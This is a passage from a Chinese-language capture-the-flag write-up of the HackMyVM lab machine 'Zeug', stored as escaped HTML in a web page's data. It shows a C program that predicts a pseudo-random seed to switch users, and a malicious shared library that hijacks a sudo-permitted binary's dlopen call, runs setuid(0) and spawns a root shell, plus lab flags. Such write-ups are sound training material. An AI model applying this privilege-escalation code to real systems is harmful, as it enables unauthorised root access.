language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -u exia /home/exia/seed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行试试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecosette@zeug:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -u exia /home/exia/seed\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -u exia /home/exia/seed\n1\n********************************************\n* Hi, Cosette, it\u003cspan class=\"hljs-string\"\u003e's time to plant the seed *\n********************************************\nEnter a number: Wrong.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e伪随机脚本\u003c/h3\u003e\n\u003cp\u003e加目录下还有\u003ccode\u003eseed_bak\u003c/code\u003e 拿出来分析分析，简单的伪随机数生成脚本\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMZeug/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e写一个脚本计算出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;stdio.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;stdlib.h\u003e\u003c/span\u003e\n\nint \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003emain\u003c/span\u003e\u003c/span\u003e()\n{\n    int v5;\n    srand(1u);\n    v5 = rand();\n    int v6 = -559038737;\n    \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"%d\\n\"\u003c/span\u003e, v5 ^ v6);\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e-1255736440\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecosette@zeug:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -u exia /home/exia/seed\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -u exia /home/exia/seed\n-1255736440\n\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1002(exia) gid=1002(exia) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1002(exia)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - to root\u003c/h2\u003e\n\u003ch3\u003e动态链接库提权\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eexia\u003c/code\u003e 家目录得到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\nHMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e exia on zeug:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser exia may run the following commands on zeug:\n    (root) NOPASSWD: /usr/bin/zeug\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eexia@zeug:/usr/bin$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e zeug\nError opening file\nexia@zeug:/usr/bin$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e zeug /etc/passwd\nError opening file\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拉出来分析\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( dlopen(\u003cspan class=\"hljs-string\"\u003e\"/home/exia/exia.so\"\u003c/span\u003e, 2) )\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 0;\n  fwrite(\u003cspan class=\"hljs-string\"\u003e\"Error opening file\\n\"\u003c/span\u003e, 1uLL, 0x13uLL, _bss_start);\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这段代码的主要目的是尝试加载一个共享库（\u003ccode\u003eexia.so\u003c/code\u003e），如果加载失败，则通过 \u003ccode\u003efwrite\u003c/code\u003e 输出错误信息到某个内存地址，并返回 \u003ccode\u003e1\u003c/code\u003e。它可以通过 \u003ccode\u003edlerror()\u003c/code\u003e 提供更详细的错误信息来改善错误处理。\u003c/p\u003e\n\u003cp\u003e并且动态链接库\u003ccode\u003eexia.so\u003c/code\u003e是我们可以控制的，直接编写一个恶意链接库即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;stdio.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;stdlib.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;unistd.h\u003e\u003c/span\u003e\n\nvoid __attribute__((constructor)) \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003esetup\u003c/span\u003e\u003c/span\u003e() {\n    // 提权操作，设置用户ID为0（root）\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (setuid(0) == -1) {\n        perror(\u003cspan class=\"hljs-string\"\u003e\"setuid failed\"\u003c/span\u003e);\n        \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(1);\n    }\n\n    // 执行提权后，显示成功信息\n    \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Privilege Escalation Successful\\n\"\u003c/span\u003e);\n    system(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash\"\u003c/span\u003e);  // 启动一个 shell，可以使用该 shell 提升权限\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egcc -shared -fPIC -o /home/exia/exia.so exia.c\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eexia@zeug:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e zeug\nPrivilege Escalation Successful\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@zeug:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \nHMYVM{root_Ut9RX5o7iZVKXjrOgcGW3fxBq}\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Zeug","date":"2025-04-22","updated":"2025-04-22","comments":true,"tags":["Linux靶机","HackMyVM","Werkzeug"],"categories":"靶机","description":"Zeug.\n\n https://hackmyvm.eu/machines/machine.php?vm=Zeug\n \n\nNotes：Enjoy it, you can do it :D\n\n该靶机有和`Leet` （https://hackmyvm.eu/machines/machine.php?vm=Leet）一样的操作，爆破 PIN 值，所以一块做了。\n\n前期踩点\n\n\n\n\n\n\n\n看样子`FTP`..."},"recentPosts":[{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"22","id":"HackMyVMZeug"},"buildId":"CzrQjS_POKRQkVUGFJThI","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>